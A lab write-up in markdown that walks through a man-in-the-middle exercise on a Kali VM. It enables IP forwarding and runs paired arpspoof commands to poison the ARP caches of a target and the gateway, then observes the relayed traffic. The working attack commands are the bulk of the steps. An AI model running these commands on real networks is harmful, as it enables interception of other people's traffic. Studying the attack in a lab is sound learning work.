# ARP Spoofing & IP Forwarding Lab (Phase 1 Completion)

## Objective
Simulate a local Man-in-the-Middle (MitM) attack by using ARP spoofing to intercept traffic between a victim device and the network gateway. Validate ARP poisoning and confirm traffic forwarding.

---

## Tools Used
- OS: VirtualBox (Kali Linux guest)
- Tools: `arpspoof`, `ifconfig` / `ip`, `tee`

---

## Step-by-Step Process

### 1. Identify Network Interfaces & IPs
Used the following to find active interfaces and local IP:

```bash
ip a
```

- **Local IP (eth0)**: `10.0.2.15`
- **Loopback**: `127.0.0.1`

---

### 2. Identify Gateway IP

```bash
ip route
```

- **Gateway IP found** (example): `10.0.2.1`

---

### 3. Enable IP Forwarding

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

- **Output**: `1` confirms forwarding is enabled.
- This allows Kali to forward packets between victim and gateway.

---

### 4. Launch ARP Spoofing

**Terminal 1**: Spoof target to think attacker is gateway:

```bash
sudo arpspoof -i eth0 -t [target_ip] [gateway_ip]
```

**Terminal 2**: Spoof gateway to think attacker is target:

```bash
sudo arpspoof -i eth0 -t [gateway_ip] [target_ip]
```

_Replace `[target_ip]` and `[gateway_ip]` with the actual IPs you gathered._

---

## Confirmation

- Once both spoofing commands are running, the attacker (you) is in the middle of the traffic flow.
- You may use tools like `tcpdump` or `Wireshark` to observe traffic being relayed.

---

## Key Concepts Demonstrated

| Concept          | Description |
|------------------|-------------|
| **ARP Spoofing** | Redirects LAN traffic by sending forged ARP replies, poisoning ARP cache. |
| **IP Forwarding**| Enables traffic to flow between interfaces (acts like a router). |
| **Man-in-the-Middle** | Intercept and optionally modify traffic between two endpoints. |

---

## Notes

- Ensure `arpspoof` is properly installed (manual build may be required on macOS).
- Spoofing may not work on networks with protection (e.g., DHCP snooping or ARP inspection).
- Always practice ARP spoofing in lab/safe environments.

---

#KREWLONLY
